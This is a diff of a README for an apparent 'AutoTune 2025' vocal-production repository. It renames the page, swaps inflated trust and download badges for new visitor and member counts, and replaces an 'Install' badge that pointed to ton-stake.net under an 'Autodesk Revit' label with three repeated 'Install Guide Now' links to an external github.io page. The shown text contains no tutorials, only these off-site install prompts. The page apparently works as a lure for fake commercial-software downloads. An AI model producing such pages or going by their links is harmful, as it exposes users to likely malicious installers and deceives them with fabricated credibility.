@@ -1,11 +1,15 @@
-![Trusted](https://img.shields.io/badge/Trusted-100%25-lightgrey?style=plastic&labelColor=lightgrey&color=grey) ![Downloads](https://img.shields.io/badge/Downloads-1M%2B-lightgrey?style=plastic&labelColor=lightgrey&color=grey) ![Release](https://img.shields.io/badge/Release-2025-orange?style=plastic&labelColor=lightgrey&color=orange)  
- 
+# 🎙️ AutoTuneMasterHub
 
-# 🎙️ AutoTune 2025 VocalHub
+![Visitors: 65K+](https://img.shields.io/badge/Visitors-65K+-blue) ![Members: 42K+](https://img.shields.io/badge/Members-42K+-green) ![Established: 2025](https://img.shields.io/badge/Established-2025-orange)
+
+![AutoTuneMasterHub Banner](https://producergrind.com/cdn/shop/articles/free-autotune-vst-plugins-download-links-2020-updated-507501_700x.png?v=1666332075)
 
 🎶 Elevate your vocal production with Auto-Tune 2025 VocalHub! This repository provides tutorials, resources, and best practices for music creators to enhance their audio projects in 2025.
 
-[![Install Autodesk Revit](https://img.shields.io/badge/Install-AUTOTUNE-blueviolet)](https://ton-stake.net)
+
+<a href="https://autotune-2025-vocal-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
 ### 🔊 Core Features
 
@@ -17,7 +21,10 @@
 - ✅ **Community Engagement**: Connect with producers and vocalists.  
 - ✅ **Workflow Tips**: Recommendations for efficient audio production.  
 
----
+
+<a href="https://autotune-2025-vocal-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
 ### 💻 System Requirements
 
@@ -27,7 +34,10 @@
 - **Processor**: Multi-core Intel/AMD (2GHz+)  
 - **DAW Compatibility**: Pro Tools, Logic Pro, FL Studio, Ableton Live  
 
----
+
+<a href="https://autotune-2025-vocal-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
 ### 🌟 What Makes It Great
 
